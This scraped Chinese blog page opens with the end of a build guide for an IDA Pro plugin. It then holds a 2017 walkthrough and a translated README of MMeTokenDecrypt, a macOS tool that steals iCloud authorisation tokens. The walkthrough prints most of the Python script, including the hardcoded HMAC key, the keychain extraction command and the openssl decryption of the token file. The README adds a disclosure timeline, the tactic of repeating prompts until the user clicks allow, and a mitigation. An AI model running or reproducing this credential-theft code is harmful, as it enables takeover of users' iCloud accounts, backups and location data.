<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>使用 <code>cmake</code> 命令准备编译环境，并运行 <code>make</code> 命令来编译插件:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ mkdir _build</div><div class="line">$ <span class="built_in">cd</span> _build</div><div class="line">$ cmake ..</div><div class="line">$ make</div></pre></td></tr></table></figure>
<h3 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h3><p>使用 <code>cmake</code> 命令准备编译环境，并运行 <code>make</code> 命令来编译插件:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ mkdir _build</div><div class="line">$ <span class="built_in">cd</span> _build</div><div class="line">$ cmake ..</div><div class="line">$ make</div></pre></td></tr></table></figure>
<p>如果你更倾向于使用Xcode工程来进行编译，那你可以运行以下命令来替换上面的步骤：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ mkdir _build</div><div class="line">$ <span class="built_in">cd</span> _build</div><div class="line">$ cmake -G Xcode ..</div><div class="line">$ open FRIEND.xcodeproj <span class="comment"># or simply run xcodebuild</span></div></pre></td></tr></table></figure>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>使用 <code>cmake</code> 命令准备编译环境，并运行 <code>make</code> 命令来编译插件:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ mkdir _build</div><div class="line">$ <span class="built_in">cd</span> _build</div><div class="line">$ <span class="string">"%VS140COMNTOOLS%\..\..\VC\vcvarsall.bat"</span> x86</div><div class="line">$ cmake -G <span class="string">"Visual Studio 14 2015"</span> ..</div><div class="line">$ msbuild FRIEND.sln /p:Configuration=Release</div></pre></td></tr></table></figure>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>将编译出来的二进制文件拷贝到IDA Pro的插件目录里。以下是不同平台的默认路径：</p>
<table>
<thead>
<tr>
<th>系统</th>
<th>插件目录</th>
</tr>
</thead>
<tbody>
<tr>
<td>Linux</td>
<td><code>/opt/ida-6.95/plugins</code></td>
</tr>
<tr>
<td>macOS</td>
<td><code>/Applications/IDA Pro 6.95/idabin/plugins</code></td>
</tr>
<tr>
<td>Windows</td>
<td><code>%ProgramFiles(x86)%\IDA 6.95\plugins</code></td>
</tr>
</tbody>
</table>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>内容讨论请查看 <a href="https://github.com/alexhude/FRIEND/issues/1" target="_blank" rel="external">这里</a></p>
<p>FRIEND 配置文件遵循以下文件结构:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;</div><div class="line">&lt;documentation&gt;</div><div class="line">	&lt;document id=&quot;pdf_id&quot; name=&quot;ARM Architecture Reference Manual&quot; version=&quot;A.k&quot;&gt;</div><div class="line">		&lt;path&gt;/path/to/your/pdf/or/link&lt;/path&gt;</div><div class="line">	&lt;/document&gt;</div><div class="line">	&lt;elements&gt;</div><div class="line">		&lt;group type=&quot;reg&quot; name=&quot;Group Name&quot;&gt;</div><div class="line">			&lt;hint page=&quot;1&quot; header=&quot;Element Header&quot; doc_id=&quot;pdf_id&quot; token=&quot;R0&quot;&gt;info&lt;/&gt;</div><div class="line">			...</div><div class="line">		&lt;/group&gt;</div><div class="line">		&lt;group type=&quot;ins&quot; name=&quot;Group Name&quot;&gt;</div><div class="line">			&lt;hint page=&quot;2&quot; header=&quot;Element Header&quot; doc_id=&quot;pdf_id&quot; token=&quot;MOV&quot;&gt;info&lt;/&gt;</div><div class="line">			...</div><div class="line">		&lt;/group&gt;</div><div class="line">		...</div><div class="line">	&lt;/elements&gt;</div><div class="line">&lt;/documentation&gt;</div></pre></td></tr></table></figure>
<p>注意：你需要将你自己的pdf文件路径填充到上面的\<path\>标签，否则无法在浏览器进行文档扩展。</path\></p>
<h2 id="提示编辑器"><a href="#提示编辑器" class="headerlink" title="提示编辑器"></a>提示编辑器</h2><p>为了使得本工程更加容易使用，这里有一个简单的配置编辑器。</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fj7ktpnl37j30vx0ikjv7.jpg" alt=""></p>
<p><strong>注意:</strong> 这个编辑器只能在MacOS以及使用Xcode8及以上的环境才能够编译，其他系统不支持。</p>
<p>使用 <code>cmake</code> 命令来生成Xcode工程。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> HintEditor/HintEditor/</div><div class="line">$ mkdir _build</div><div class="line">$ <span class="built_in">cd</span> _build</div><div class="line">$ cmake -G Xcode ..</div><div class="line">$ xcodebuild</div></pre></td></tr></table></figure>
<p>使用<code>open</code>命令来启动应用程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ open Debug/HintEditor.app</div></pre></td></tr></table></figure>
<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><p>FRIEND 依赖要求:  </p>
<ul>
<li><a href="https://www.hex-rays.com/products/ida/support/download.shtml" target="_blank" rel="external">IDA SDK</a>   </li>
<li><a href="https://github.com/aquynh/capstone" target="_blank" rel="external">Capstone</a> (使用 Patches/capstone.diff 分支编译)  </li>
<li><a href="https://github.com/zeux/pugixml" target="_blank" rel="external">pugixml</a></li>
</ul>
<p>提醒编辑器依赖要求：</p>
<ul>
<li><a href="https://github.com/tadija/AEXML" target="_blank" rel="external">AEXML</a> (使用 Patches/aexml.diff 分支编译)  </li>
</ul>
<h2 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h2><p>@ <strong>in7egral, mbazaliy</strong> for bug reports and all kind of support<br>@ <strong>qwertyoruiopz, iH8sn0w, Morpheus______, xerub, msolnik, marcograss, pr0x13, _argp, oleavr, brinlyau</strong> and other gang for inspiration<br>@ <strong>_kamino_</strong> for porting project to Windows and Linux<br>@ <strong>williballenthin</strong> for the idea of function summary</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chensh.top/2017/07/08/MMeTokenDecrypt实践操作/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Chensh">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Forest Mist">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/08/MMeTokenDecrypt实践操作/" itemprop="url">MMeTokenDecrypt.py</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-08T08:10:53+08:00">
                2017-07-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="MMeTokenDecrypt实践操作"><a href="#MMeTokenDecrypt实践操作" class="headerlink" title="MMeTokenDecrypt实践操作"></a>MMeTokenDecrypt实践操作</h1><ul>
<li>本文实践操作基于<a href="https://github.com/manwhoami/MMeTokenDecrypt" target="_blank" rel="external">MMeTokenDecrypt</a>项目。</li>
<li>查看翻译请访问：<a href="https://github.com/mail2chensh/OSG_Leaning/blob/master/002_MMeTokenDecrypt/MMeTokenDecrypt%E7%BF%BB%E8%AF%91.md" target="_blank" rel="external">MMeTokenDecrypt翻译</a></li>
<li>实践者： Chensh</li>
</ul>
<h2 id="前言背景"><a href="#前言背景" class="headerlink" title="前言背景"></a>前言背景</h2><p>在MacOS系统的深处，有一把神秘的小钥匙。这把密钥由44个随机字符组成，它的作用非常大。</p>
<p>有多大？它可以用来解开我们存储在系统里面的授权Token！</p>
<p>我们都知道（未读原文前我根本就不知道，😆），在MacOS里，用户的授权Token都存储在<strong>/Users/*/Library/Application Support/iCloud/Accounts/</strong>这个目录下，以用户的<strong>iCloud账号</strong>（邮箱）为名的文件，其存储格式是<strong>DSID</strong>，这个文件是加密过的。</p>
<p>那平常系统需要用到这个文件里面存储的token的时候，是如何解密的呢？</p>
<p>这里涉及另外一个密钥，这个密钥存储在用户的<strong>keyChain</strong>里面，一个名为iCloud的条目。</p>
<p>系统需要解密这个DSID文件时，就会从keyChain里面拿出解密密钥，进行<strong>base64编码</strong>，作为<strong>Hmac算法</strong>的<strong>消息体</strong>输入，然后和上面提到的神秘小钥匙进行了<strong>MD5加密</strong>，得到一把新的钥匙。</p>
<p>而这个DSID文件，是采用128位AES的CBC加密模式加密的。CBC加密模式就是密码分组链接模式，这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥（也就是上面<strong>新</strong>产生的那把钥匙）进行加密。当然，这个过程还混合了一个空的初始化向量进行计算。</p>
<p>所以，根据上文的分析，只要我们找到系统的神秘小钥匙和拿到keyChain里面iCloud的存储条目，那我们就可以尝试解密DSID这个文件，拿到用户的Token。</p>
<p>而这里的神秘小钥匙已经被原文作者找到了并提供出来，作者在原文里主要阐述的是<strong>keyChain里面存在的bug，导致解密密钥容易被泄露</strong>。</p>
<p>那么接下来，我们就开始复现作者的思路。</p>
<h2 id="keyChain的不安全性"><a href="#keyChain的不安全性" class="headerlink" title="keyChain的不安全性"></a>keyChain的不安全性</h2><p>本来keychain作为用户存储密码的载体，应该是做到很安全的，但这里有一个原文作者认为的bug，恶意用户可以根据这个bug来绕过钥匙串密码从而拿到keychain里面存储的条目。当然，这个绕过方式是有条件的，以下分别介绍两种情况。</p>
<h4 id="当用户没有设防"><a href="#当用户没有设防" class="headerlink" title="当用户没有设防"></a>当用户没有设防</h4><p>我们首先打开keychain应用(Spotlight里面输入Keychain Access进行搜索)。</p>
<p>然后在左侧<strong>种类</strong>栏目<strong>密码</strong>一项进行选中，右侧就会出现存储在本机上的所有安全信息存储。这里进行筛选，找到我们的试验目标：<strong>Chrome Safe Storage</strong>。这个条目存储了谷歌Chrome浏览器的安全存储信息解密密钥。</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fhb0jtvyiqj31kw087400.jpg" alt=""></p>
<p>那要如何拿到这个解密密钥呢？上文我们已经提及到了，这里打开命令行。输入以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> security find-generic-password -ga 'Chrome'</div></pre></td></tr></table></figure>
<p>这里使用到了 security命令，它是非常强大命令行安全工具，之前我们<a href="http://chensh.top/2017/06/30/Patching-and-ReSigning-iOS-Apps/">重签</a>的那篇文章里面也使用到了这个命令去查找有效的证书。</p>
<p>这里的参数解释如下：</p>
<ul>
<li><strong>find-generic-password</strong> 命令参数，是使用“查找密码”的功能。</li>
<li><strong>-a</strong>，这个参数是匹配类型为“账户”的，用于过滤。</li>
<li><strong>-g</strong>，这个参数是将查询到的密码显示出来。</li>
</ul>
<p>运行这个命令后，系统马上就会弹出一个提示框，如下：</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fhb0zu1parj30ok0badhp.jpg" alt=""></p>
<p>那么到这里，只要用户点击了“允许”按钮，那么就可以马上得到存储在keychain里面的密钥了。如下：</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fhblsp9swej30zg0ngtd0.jpg" alt=""></p>
<p>这里security请求钥匙串访问的权限，用户点击“允许”后，就能读取到相应的password。</p>
<p>假如有人未经你允许擅动你电脑，这个时候就可以轻而易举的窃取了你密码。</p>
<p>当然，如果是远程的恶意黑客，那么有可能会无限次弹出弹窗提示，直至逼到你点击“允许”按钮为止。</p>
<p>那我们该如何防范这种情况呢？请往下看。</p>
<h4 id="当用户开启了“询问钥匙串密码”选项"><a href="#当用户开启了“询问钥匙串密码”选项" class="headerlink" title="当用户开启了“询问钥匙串密码”选项"></a>当用户开启了“询问钥匙串密码”选项</h4><p>我们回到刚刚keychain 里面那个chrome safe storage的条目，右键选择<strong>显示简介</strong>。</p>
<p>切换到<strong>访问控制</strong>的面板，将<strong>询问钥匙串密码</strong>选中。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fhblzkxuz7j30ty0jkgnl.jpg" alt=""></p>
<p>这里有另外一个小bug，就是keychain里面的更改需要重复两次操作，才能真正的修改成功，当我们勾选了这个选项，切换到<em>属性</em>然后再切换回来的时候，发现这个选项又没有被选中，需要再重复操作一遍才行。</p>
<p>然后我们回到命令行，重新输入上面security的命令，这一次我们发现弹窗出来不一样了。这里需要我们输入钥匙串密码。</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fhbm32ymorj30oe0b8tao.jpg" alt=""></p>
<p>所以当我们开启了这个选项，就算别人偷偷用你的电脑，没有你的钥匙串密码，也无法得到其中的安全信息。这里就多了一道防护。</p>
<p>以上的操作步骤，我们主要对是否开启钥匙串密码的安全性做一点讨论。接下来我们要使用脚本来自动获取密码，并且结合系统的神秘小钥匙，用来解密我们iCloud条目里面的Token。</p>
<h2 id="MMeToenDecrypt-py-解析"><a href="#MMeToenDecrypt-py-解析" class="headerlink" title="MMeToenDecrypt.py 解析"></a>MMeToenDecrypt.py 解析</h2><p>先引入所需要的库。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64, hashlib, hmac, subprocess, sys, glob, os, binasicc</div><div class="line"><span class="keyword">from</span> Foundation <span class="keyword">import</span> NSData, NSPropertyListSerialization</div></pre></td></tr></table></figure>
<ul>
<li>base64用来加密iCloud的钥匙。</li>
<li>hashlib用于计算md5</li>
<li>subprocess用于fork一个子进程，并运行一个外部程序。</li>
</ul>
<p>按照上面的方法，使用security命令获取iCloud条目的密码。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">security find-generic-password -ws 'iCloud'</div></pre></td></tr></table></figure>
<ul>
<li>-w 参数是用于仅显示密码项。</li>
<li>-s 参数是用于指定类型为server的条目，并匹配后面的关键词。</li>
</ul>
<p>在python里面，我们可以是subprocess库来运行外部程序，将shell环境下命令运行的结果返回到本程序。如果没有获取到，则打印报错信息，再退出程序。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">iCloudKey = subprocess.check_output(<span class="string">"security find-generic-password -ws 'iCloud' | awk &#123;'print $1'&#125;"</span>, shell=<span class="keyword">True</span>).replace(<span class="string">"\n"</span>, <span class="string">""</span>)</div><div class="line"><span class="keyword">if</span> iCloudKey == <span class="string">""</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Error getting iCloud Decryption Key"</span></div><div class="line">    sys.exit()</div></pre></td></tr></table></figure>
<p>得到iCloud的密码后，我们将其进行base64编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg = base64.b64decode(iCloudKey)</div></pre></td></tr></table></figure>
<p>接下来上场的是我们那把神秘的小钥匙了。</p>
<p>它在所有的Macos版本里面都用于生成Hmac哈希。它是用于解密的关键。</p>
<p>在位于<strong>/System/Library/PrivateFrameworks/AOSKit.framework/Versions/A/AOSKit</strong>路径下的系统库，执行了下面的方法，调用了CCHmac来生成一个Hmac，用于解密秘钥。</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="type">KeychainAccountStorage</span> _generateKeyFromData:</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">key = <span class="string">"t9s\"lx^awe.580Gj%'ld+0LG&lt;#9xa?&gt;vb)-fkwb92[&#125;"</span></div></pre></td></tr></table></figure>
<p>将上面得到的iCloudKey和系统神秘钥匙使用hmac进行md5计算。</p>
<p>并将我们得到的哈希值进行16进制转换。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hashed = hmac.new(key, msg, digestmod=hashlib.md5).digest()</div><div class="line">hexedKey = binascii.hexlify(hashed)</div></pre></td></tr></table></figure>
<p>我们知道用户的授权Token都存放在<strong>~/Library/Application Support/iCloud/Accounts/</strong> 下，所以要遍历一下该文件夹下面的文件，判断是否为我们所需要的DSID文件(纯数字文件名)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mmeTokenFile = glob.glob(<span class="string">"%s/Library/Application Support/iCloud/Account/*"</span> % os.path.expanduser(<span class="string">"~"</span>))</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> mmeTokenFile:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        int(x.split(<span class="string">"/"</span>)[<span class="number">-1</span>])</div><div class="line">        mmeTokenFile = x</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">continue</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">not</span> isinstance(mmeTokenFile, str):</div><div class="line">    <span class="keyword">print</span><span class="string">"Could not find MMeTokenFile. You can specify the file manually"</span></div><div class="line">  	sys.exit()</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Decrypting token plist -&gt; [%s]\n"</span> % mmeTokenFile</div></pre></td></tr></table></figure>
<p>接下来我们使用openssl这个命令行工具，将一个空的初始化向量IV和上面已经被16进制转换的密钥，以及我们找到DSID文件，进行128位的AES解密。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">decryptedBinary = subprocess.check_output(<span class="string">"openssl enc -d -aes-128-cbc -iv '%s' -K %s &lt; '%s'"</span> % (IV, hexedKey, mmeTokenFile), shell=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<p>这里得到的decryptedBinary是解密出来的二进制数据，我们使用Foundation库里面的类来将它转化为可读取的plist格式。</p>
<p>然后遍历这个plist格式对象，将其中的内容打印出来。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">binToPlist = NSData.dataWithBytes_length_(decryptedBinary, len(decryptedBinary))</div><div class="line"></div><div class="line">tokenPlist = NSPropertyListSerialization.propertyListWithData_options_format_error_(binToPlist, <span class="number">0</span>, <span class="keyword">None</span>, <span class="keyword">None</span>)[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Successfully decrypted token plist!\n"</span></div><div class="line"><span class="keyword">print</span> <span class="string">"%s [%s -&gt; %s]"</span> % (tokenPlist[<span class="string">"appleAccountInfo"</span>][<span class="string">"primaryEmail"</span>], tokenPlist[<span class="string">"appleAccountInfo"</span>][<span class="string">"fullName"</span>], tokenPlist[<span class="string">"appleAccountInfo"</span>][<span class="string">"dsPrsID"</span>])</div><div class="line"><span class="keyword">print</span> tokenPlist[<span class="string">"tokens"</span>]</div></pre></td></tr></table></figure>
<p>至此，我们的重现步骤到此结束，整个流程下来你可以发现，只要用户不小心点击了“允许”按钮，我们就很容易的窃取到了iCloud里面的Token。</p>
<p>你可以尝试在自己的机子上运行这份代码，假如能够打印出来相关的iCloud账号Token，那就说明你成功重现了。</p>
<p><img src="https://ww1.sinaimg.cn/large/006tKfTcgy1fgpsk3r7b3j308c08c3ys.jpg" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chensh.top/2017/07/04/MMeTokenDecrypt/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Chensh">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Forest Mist">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/04/MMeTokenDecrypt/" itemprop="url">MMeTokenDecrypt</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-04T23:05:08+08:00">
                2017-07-04
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="MMeTokenDecrypt"><a href="#MMeTokenDecrypt" class="headerlink" title="MMeTokenDecrypt"></a>MMeTokenDecrypt</h1><p><strong>原文链接：</strong> <a href="https://github.com/manwhoami/MMeTokenDecrypt" target="_blank" rel="external">MMeTokenDecrypt</a></p>
<p><strong>作者： </strong> manwhoami</p>
<p><strong>翻译：</strong>  Chensh</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个程序利用了在<strong>macOS</strong>上授权访问钥匙串的流程中的一个缺陷，使得可以无需用户身份验证，即可解密或提取出所有存储在 macOS/ OS X/ OSX上面的授权令牌(Authorization Tokens)。</p>
<p>所有的授权令牌都存储在这个目录下：<strong>/Users/*/Library/Application Support/iCloud/Accounts/DSID</strong>。 DSID是每一个iCloud账户在苹果系统里的后端存储格式。</p>
<p>这个<strong>DSID</strong>格式文件使用了<strong>128位AES的CBC模式</strong>[^注1] 和一个空的<strong>初始化向量</strong>进行加密的。而针对这个文件的解密密钥则是存储在用户的<strong>钥匙串</strong>里面一个名为<strong>iCloud</strong>的服务条目下，名字是iCloud账户相关的邮件地址。</p>
<p>这个解密钥匙进行了base64编码，并作为<strong>Hmac算法</strong>[^注2]中的消息体，进行标准的<strong>MD5哈希加密</strong>。这里的问题是，Hmac算法里所需的输入钥匙，被藏在了<strong>MacOS内核</strong>深处。这个钥匙由44个随机字符组成，它是解密DSID文件的关键。本分支已经包含了这个钥匙，就我所知，到目前为止这个钥匙还未在网上被公开过。</p>
<h2 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h2><p>目前市面上的软件拥有类似功能的有一款名为“<strong>Elcomsoft Phone Breaker</strong>[^注3]”的取证工具。MMeTokenDecrypt是开源的，允许开发者包含这个解密iCloud授权的文件到他们的工程里。</p>
<p>苹果必须要重新设计钥匙串信息。因为本程序fork了一个苹果已经签名的二进制文件作为子进程，当用户看到钥匙串访问请求弹窗时，并没有意识到背后的危险。更进一步，攻击者可以重复弹出钥匙串弹窗给用户，直至用户允许了钥匙串访问为止，因为苹果并没有为拒绝选项设定一个超时。这将会使得iCloud授权令牌被盗窃，而这些令牌可以用来访问几乎所有iCloud的服务项目：<strong>iOS备份，iCloud联系人，iCloud Drive， iCloud 图片库， 查找我的好友，查找我的手机（查看我其他的项目）</strong>。</p>
<h2 id="上报反馈历程"><a href="#上报反馈历程" class="headerlink" title="上报反馈历程"></a>上报反馈历程</h2><ul>
<li>2016年10月17日开始联系了苹果，我非常详细的阐述了如何破坏用户钥匙串授权的方法，并在不同的macOS系统版本中重现。</li>
<li>直到2016年11月6日，没有得到苹果的任何反馈。(委屈😢失落的作者……)</li>
<li>bug报告包含了破坏整个钥匙串访问。MMeTokenDecrypt只是这个bug的其中一个实现。查看我的其他项目，<strong>OSXChromeDecrypt</strong>是这个bug的另外一种实现。</li>
<li>报告中有个值得注意的摘录如下：</li>
</ul>
<blockquote>
<p>此外，假如我们是远程攻击者，当“询问钥匙串密码”的选项没有被勾选，那么我们本质上就是通过代码实现强制弹窗提示，迫使用户单击“允许”按钮，这样我们就可以获得密码。但是，如果“通过密码访问钥匙串”的选项被选中，并且用户点击了“拒绝”按钮，那么强制提示则会变得比较棘手。</p>
</blockquote>
<ul>
<li>我已经把bug的报告上传到本项目中，并将实时同步苹果的更新。</li>
</ul>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>运行python文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> python MMeDecrypt.py</div></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">Decrypting token plist -&gt; [/Users/bob/Library/Application Support/iCloud/Accounts/123456789]</div><div class="line"></div><div class="line">Successfully decrypted token plist!</div><div class="line"></div><div class="line">bobloblaw@gmail.com Bob Loblaw -&gt; [123456789]</div><div class="line"></div><div class="line">cloudKitToken = AQAAAABYXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~</div><div class="line"></div><div class="line">mapsToken = AQAAAAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~</div><div class="line"></div><div class="line">mmeAuthToken = AQAAAABXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=</div><div class="line"></div><div class="line">mmeBTMMInfiniteToken = AQAAAABXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~</div><div class="line"></div><div class="line">mmeFMFAppToken = AQAAAABXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~</div><div class="line"></div><div class="line">mmeFMIPToken = AQAAAABXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~</div></pre></td></tr></table></figure>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>假如你是使用 homebrew 安装的python版本，那么你运行这个脚本的时候有可能会遇到以下错误：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">user@system:~/code/MMeTokenDecrypt $ python MMeDecrypt.py</div><div class="line">Traceback (most recent call last):</div><div class="line">  File "MMeDecrypt.py", line 2, in &lt;module&gt;</div><div class="line">    from Foundation import NSData, NSPropertyListSerialization</div><div class="line">ImportError: No module named Foundation</div></pre></td></tr></table></figure>
<p>想要解决这个问题，你可以手动指定一个你系统上默认的python版本的完整的路径。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@system:~/code/MMeTokenDecrypt $ /usr/bin/python MMeDecrypt.py</div><div class="line">Decrypting token plist -&gt; [/Users/user/Library/Application Support/iCloud/Accounts/123413453]</div><div class="line"></div><div class="line">Successfully decrypted token plist!</div><div class="line"></div><div class="line">user@email.com [First Last -&gt; 123413453]</div><div class="line">&#123;</div><div class="line">    cloudKitToken = "AQAAAABXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~";</div><div class="line">    mapsToken = "AQAAAAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~";</div><div class="line">    mmeAuthToken = "AQAAAABXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=";</div><div class="line">    mmeBTMMInfiniteToken = "AQAAAABXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~";</div><div class="line">    mmeFMFAppToken = "AQAAAABXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~";</div><div class="line">    mmeFMIPToken = 